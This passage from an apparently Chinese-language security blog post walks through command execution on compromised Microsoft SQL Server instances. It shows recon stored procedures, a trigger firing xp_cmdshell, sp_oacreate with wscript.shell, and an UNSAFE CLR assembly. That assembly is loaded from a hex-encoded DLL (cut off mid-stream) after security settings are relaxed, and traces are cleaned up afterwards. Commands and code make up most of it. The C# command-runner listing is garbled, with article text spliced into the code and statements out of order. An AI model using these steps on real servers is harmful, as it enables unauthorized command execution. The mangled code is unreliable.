&quot;C:\\&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/image22.png"></p><hr><h3 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h3><h4 id="获取服务器名称"><a href="#获取服务器名称" class="headerlink" title="获取服务器名称"></a>获取服务器名称</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_getnetname</span><br></pre></td></tr></table></figure><p><img src="/images/image23.png"></p><hr><h3 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h3><h4 id="获取服务器信息"><a href="#获取服务器信息" class="headerlink" title="获取服务器信息"></a>获取服务器信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_msver</span><br></pre></td></tr></table></figure><p><img src="/images/image24.png"></p><hr><h3 id="xp-fixeddrives"><a href="#xp-fixeddrives" class="headerlink" title="xp_fixeddrives"></a>xp_fixeddrives</h3><h4 id="获取磁盘空间信息"><a href="#获取磁盘空间信息" class="headerlink" title="获取磁盘空间信息"></a>获取磁盘空间信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fixeddrives</span><br></pre></td></tr></table></figure><p><img src="/images/image25.png"></p><p>附常用的一些危险的存储过程，可自查存储过程的功能和用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell </span><br><span class="line">xp_dirtree </span><br><span class="line">xp_enumgroups </span><br><span class="line">xp_fixeddrives </span><br><span class="line">xp_loginconfig </span><br><span class="line">xp_enumerrorlogs </span><br><span class="line">xp_getfiledetails </span><br><span class="line">Sp_OACreate </span><br><span class="line">Sp_OADestroy </span><br><span class="line">Sp_OAGetErrorInfo </span><br><span class="line">Sp_OAGetProperty </span><br><span class="line">Sp_OAMethod </span><br><span class="line">Sp_OASetProperty </span><br><span class="line">Sp_OAStop </span><br><span class="line">Xp_regaddmultistring </span><br><span class="line">Xp_regdeletekey </span><br><span class="line">Xp_regdeletevalue </span><br><span class="line">Xp_regenumvalues </span><br><span class="line">Xp_regread</span><br><span class="line">Xp_regremovemultistring </span><br><span class="line">Xp_regwrite </span><br><span class="line">sp_makewebtask</span><br></pre></td></tr></table></figure><hr><h2 id="SQL-Server-触发器"><a href="#SQL-Server-触发器" class="headerlink" title="SQL Server 触发器"></a>SQL Server 触发器</h2><p>SQL Server 触发器用于执行指定动作之后执行sql语句，比如配合update触发sql语句。首先创建一个test表，插入字段值。</p><p><img src="/images/image26.png"><br><img src="/images/image27.png"></p><p>创建一个名为test1的触发器，当test表执行update动作时，触发test1执行xp_cmdshell命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set ANSI_NULLS on go</span><br><span class="line">set QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [test1] </span><br><span class="line">on [test]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">execute master..xp_cmdshell &#39;cmd.exe &#x2F;c calc.exe&#39;</span><br><span class="line">end go</span><br></pre></td></tr></table></figure><p><img src="/images/image28.png"><br>执行下列更新test表操作，test1触发器触发。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE test SET name &#x3D; &#39;wangwu&#39; WHERE LastName &#x3D; &#39;zhangsan&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image29.png"></p><hr><h2 id="SQL-Server-COM组件"><a href="#SQL-Server-COM组件" class="headerlink" title="SQL Server COM组件"></a>SQL Server COM组件</h2><p>SQL Server中的COM组件SP_OACREATE，执行系统命令，但是此利用方法无回显。</p><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE"></a>SP_OACREATE</h3><p>查看SP_OACREATE状态。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;SP_OACREATE&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image30.png"></p><p>利用count(*)判断是否存在，，存在即返回1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype&#x3D;&#39;x&#39; and name&#x3D;&#39;SP_OACREATE&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image31.png"></p><h3 id="启用SP-OACREATE"><a href="#启用SP-OACREATE" class="headerlink" title="启用SP_OACREATE"></a>启用SP_OACREATE</h3><p>利用sp_configure存储过程，启用SP_OACREATE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE WITH OVERRIDE; </span><br><span class="line">exec sp_configure &#39;Ole Automation Procedures&#39;, 1; RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p><img src="/images/image32.png"></p><h3 id="利用SP-OACREATE执行命令"><a href="#利用SP-OACREATE执行命令" class="headerlink" title="利用SP_OACREATE执行命令"></a>利用SP_OACREATE执行命令</h3><p>利用SP_OACREATE执行系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\Windows\System32\cmd.exe &#x2F;c whoami &#x2F;all &gt;C:\\test\test.txt&#39;</span><br></pre></td></tr></table></figure><p><img src="/images/image33.png"></p><hr><h2 id="SQL-Server-CLR相关利用"><a href="#SQL-Server-CLR相关利用" class="headerlink" title="SQL Server CLR相关利用"></a>SQL Server CLR相关利用</h2><hr><p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。这意味着现在可以使用任何.NET Framework 语言（包括 Microsoft Visual Basic .NET 和Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。官方链接：<a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15</a> 在利用MSSQL服务实现命令执行的时候，通常的做法是利用xp_cmdshell存储过程在MSSQL进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用LOLBINS，添加新的操 作系统用户，或通过BCP向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR方式可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p><h3 id="创建CLR"><a href="#创建CLR" class="headerlink" title="创建CLR"></a>创建CLR</h3><p>利用VS创建MSSQL数据库项目<br><img src="/images/image34.jpeg"></p><p>修改目标平台和勾选创建脚本<br><img src="/images/image35.jpeg"></p><p>在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY SQLCLRTest FROM &#39;C:\MyDBApp\SQLCLRTest.dll&#39; WITH PERMISSION_SET &#x3D; SAFE;</span><br></pre></td></tr></table></figure><p>其权限集有三个选项：<br>SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。<br>EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。<br>UNSAFE：允许使用任何代码。<br>微软关于SQL CLR的详细文档可通过以下地址获得： <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a><br>修改目标框架和权限级别为UNSAFE。<br><img src="/images/image36.jpeg"></p><p>创建SQL CLR C# 存储过程</p><p><img src="/images/image37.jpeg"></p><p>写入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"> public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void ExecCommand (string cmd)</span><br><span class="line">    &#123;</span><br><span class="line">&#x2F;&#x2F; 在此处放置代码</span><br><span class="line">SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;); SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; &#x2F;c &quot; + cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static string RunCommand(string filename,string arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        var process &#x3D; new Process();</span><br><span class="line">        process.StartInfo.FileName &#x3D; filename;</span><br><span class="line">        if (!string.IsNullOrEmpty(arguments))</span><br><span class="line">        &#123;</span><br><span class="line">            process.StartInfo.Arguments &#x3D; arguments;</span><br><span class="line">        &#125;</span><br><span class="line">        process.StartInfo.CreateNoWindow &#x3D; true;</span><br><span class="line">        process.StartInfo.WindowStyle &#x3D; ProcessWindowStyle.Hidden;</span><br><span class="line">        process.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">        process.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">        var stdOutput &#x3D; new StringBuilder();</span><br><span class="line">        process.OutputDataReceived +&#x3D; (sender, args) &#x3D;&gt;</span><br><span class="line">stdOutput.AppendLine(args.Data);</span><br><span class="line">        string stdError &#x3D; null;</span><br><span class="line">try &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line">        if (process.ExitCode &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(stdOutput.ToString());</span><br><span class="line">        &#125;</span><br><span class="line">else &#123;</span><br><span class="line">            var message &#x3D; new StringBuilder();</span><br><span class="line">            if (!string.IsNullOrEmpty(stdError))</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(stdError);</span><br><span class="line">            &#125;</span><br><span class="line">            if (stdOutput.Length !&#x3D; 0)</span><br><span class="line">            &#123;</span><br><span class="line">process.Start();</span><br><span class="line">process.BeginOutputReadLine();</span><br><span class="line">stdError &#x3D; process.StandardError.ReadToEnd();</span><br><span class="line">process.WaitForExit();</span><br><span class="line">message.AppendLine(&quot;Std output:&quot;);</span><br><span class="line"> </span><br><span class="line"> 编译生成DLL文件。</span><br><span class="line">运行权限级别为“SAFE”的代码，只需启用CLR就可以了;但是，要想运行权限级别为 “EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和 之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍:</span><br><span class="line">对于SQL Server 2017之前的版本 显示高级选项:</span><br><span class="line"> </span><br><span class="line">sp_configure &#39;show advanced options&#39;,1;RECONFIGURE</span><br><span class="line"> 启用CLR:</span><br><span class="line">message.AppendLine(stdOutput.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code</span><br><span class="line">&#x3D; &quot; + process.ExitCode + &quot;: &quot; + message);</span><br><span class="line">&#125;</span><br><span class="line">        return stdOutput.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image38.jpeg"></p><p>编译生成DLL文件。</p><p><img src="/images/image39.png"></p><p>运行权限级别为“SAFE”的代码，只需启用CLR就可以了;但是，要想运行权限级别为 “EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和 之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍:</p><h4 id="对于SQL-Server-2017之前的版本"><a href="#对于SQL-Server-2017之前的版本" class="headerlink" title="对于SQL Server 2017之前的版本"></a>对于SQL Server 2017之前的版本</h4><p>显示高级选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1;RECONFIGURE</span><br></pre></td></tr></table></figure><p><img src="/images/image40.png"><br>启用CLR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;clr enabled&#39;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="/images/image41.png"></p><p>将存储.Net程序集的数据库配置为可信赖的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br></pre></td></tr></table></figure><p><img src="/images/image42.png"></p><h4 id="SQL-Server-2017及更高版本"><a href="#SQL-Server-2017及更高版本" class="headerlink" title="SQL Server 2017及更高版本"></a>SQL Server 2017及更高版本</h4><p>对于SQL Server 2017及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的 SHA512哈希值，针对单个程序集授予其UNSAFE权限，而不是将整个数据库都标记为可信的。对于SQL Server 2017及以上版本，如下所示:</p><p>显示高级选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1;RECONFIGURE</span><br></pre></td></tr></table></figure><p>启用CLR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#39;clr enabled&#39;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>将某程序集的SHA512哈希值添加到可信程序集列表中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_add_trusted_assembly @hash&#x3D; &lt;SHA512 of DLL&gt;;</span><br></pre></td></tr></table></figure><p>从现在开始，程序集的创建和调用对于任何SQL Server版本来说，都是一样的。通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二 进制文件并将其写入SQL服务器进程可访问的位置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY clrassem from &lt;HEX STRING&gt; WITH PERMISSION_SET &#x3D; UNSAFE;</span><br></pre></td></tr></table></figure><p>创建存储过程，以从程序集运行代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE debugrun AS EXTERNAL NAME clrassem.StoredProcedures.runner;</span><br></pre></td></tr></table></figure><p>运行该存储过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugrun</span><br></pre></td></tr></table></figure><p>在代码运行后，可以删除存储过程、程序集以及受信任的哈希值，并将前面修改的安全设置恢复原值。<br>下面显示了一个完成该任务的SQL查询示例<br>对于SQL Server 2017及更高版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_drop_trusted_assembly @hash&#x3D;&lt;SHA512 of DLL&gt;</span><br></pre></td></tr></table></figure><p>对于SQL Server 2017之前的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE &lt;CONNECTED DATABASE&gt; SET TRUSTWORTHY OFF;</span><br></pre></td></tr></table></figure><p>对于所有版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE debugrun;</span><br><span class="line">DROP ASSEMBLY clrassem;</span><br><span class="line">sp_configure &#39;clr strict security&#39;,1;RECONFIGURE</span><br><span class="line">sp_configure &#39;show advanced options&#39;,0;RECONFIGURE</span><br></pre></td></tr></table></figure><h3 id="利用SQL语句导入程序集"><a href="#利用SQL语句导入程序集" class="headerlink" title="利用SQL语句导入程序集"></a>利用SQL语句导入程序集</h3><p>现在可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p><p><img src="/images/image39.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [Database1]</span><br><span class="line">AUTHORIZATION [dbo]</span><br><span class="line">FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD2154</span><br><span class="line">6869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D</span><br><span class="line">0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00</span><br><span class="line">000006000000000000522C0000002000000040000000000010002000000002000004000000000000</span><br><span class="line">00040000000000000000800000000200000000000003004085000010000010000000001000001000</span><br><span class="line">0000000000100000000000000000000000002C00004F00000000400000A802000000000000000000</span><br><span class="line">000000000000000000006000000C000000C82A00001C000000000000000000000000000000000000</span><br><span class="line">00000000000000000000000000000000000000000000000000002000000800000000000000000000</span><br><span class="line">00082000004800000000000000000000002E74657874000000580C000000200000000E0000000200</span><br><span class="line">00000000000000000000000000200000602E72737263000000A80200000040000000040000001000</span><br><span class="line">00000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400</span><br><span class="line">000000000000000000000000004000004200000000000000000000000000000000342C0000000000</span><br><span class="line">0048000000020005007C2200004C0800000100000000000000000000000000000000000000000000</span><br><span class="line">000000000000000000000000000000000000000000000000000000000000000000CA00280600000A</span><br><span class="line">72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700</span><br><span class="line">000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00</span><br><span class="line">000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E</span><br><span class="line">00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100</span><br><span class="line">000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A</span><br><span class="line">6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A0000</span><br><span class="line">0A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE011305</span><br><span class="line">11052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A13</span><br><span class="line">0608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE</span><br><span class="line">03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A26</span><br><span class="line">00280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209</span><br><span class="line">282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F070000</span><br><span class="line">0A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC001808000001220228</span><br><span class="line">2200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000</span><br><span class="line">000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B40300</span><br><span class="line">0023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000</span><br><span class="line">008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600</span><br><span class="line">00010000001400000003000000010000000500000005000000230000000500000001000000010000</span><br><span class="line">0003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA</span><br><span class="line">02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E</span><br><span class="line">00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A7</span><br><span class="line">0206001402400006002102400006003100E401000000003700000000000100010001001000E90200</span><br><span class="line">00150001000100030110000100000015000100040006007003790050200000000096008D007D0001</span><br><span class="line">00842000000000960099001A0002005C22000000008618A102060004005C22000000008618A10206</span><br><span class="line">0004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A</span><br><span class="line">020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A</span><br><span class="line">0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079</span><br><span class="line">001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206</span><br><span class="line">008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C00390043</span><br><span class="line">0306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C0071</span><br><span class="line">0035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B1</span><br><span class="line">0063002B00BA00200004800000000000000000000000000000000027000000040000000000000000</span><br><span class="line">00000070005F000000000004000000000000000000000070004A0000000000040000000000000000</span><br><span class="line">0000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C</span><br><span class="line">52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E</span><br><span class="line">0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962</span><br><span class="line">006164645F4F757470757444617461526563656976656400636D640052656164546F456E64004578</span><br><span class="line">6563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F64650067</span><br><span class="line">65745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F77</span><br><span class="line">5374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F757470757452</span><br><span class="line">6561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70</span><br><span class="line">696C657247656E6572617465644174747269627574650044656275676761626C6541747472696275</span><br><span class="line"> 74650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61</span><br><span class="line">786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474</span><br><span class="line">726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F</span><br><span class="line">4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765</span><br><span class="line">745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465</span><br><span class="line">72005465787452656164657200537472696E674275696C6465720073656E64657200446174615265</span><br><span class="line">6365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E53</span><br><span class="line">6572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E</span><br><span class="line">646172644572726F72002E63746F720053797374656D2E446961676E6F7374696373005379737465</span><br><span class="line">6D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465</span><br><span class="line">730053746F72656450726F63656475726573004461746152656365697665644576656E7441726773</span><br><span class="line">00617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F</span><br><span class="line">6E636174004F626A6563740057616974466F7245786974005374617274007365745F526564697265</span><br><span class="line">63745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053</span><br><span class="line">716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D70</span><br><span class="line">7479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E</span><br><span class="line">0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E</span><br><span class="line">00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A</span><br><span class="line">0000372000660069006E006900730068006500640020007700690074006800200065007800690074</span><br><span class="line">00200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084</span><br><span class="line">DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D</span><br><span class="line">0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520</span><br><span 